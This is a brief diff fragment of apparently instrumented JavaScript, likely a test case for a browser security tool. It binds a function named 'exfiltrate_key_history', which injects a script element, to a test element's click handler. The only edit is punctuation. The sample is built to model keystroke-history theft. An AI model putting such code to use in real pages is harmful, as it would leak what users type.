@@ -9,5 +9,4 @@ function exfiltrate_key_history() {
   JAM.call(v2.appendChild, v2, [script]);
   return
 }
-JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history);
-
+JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
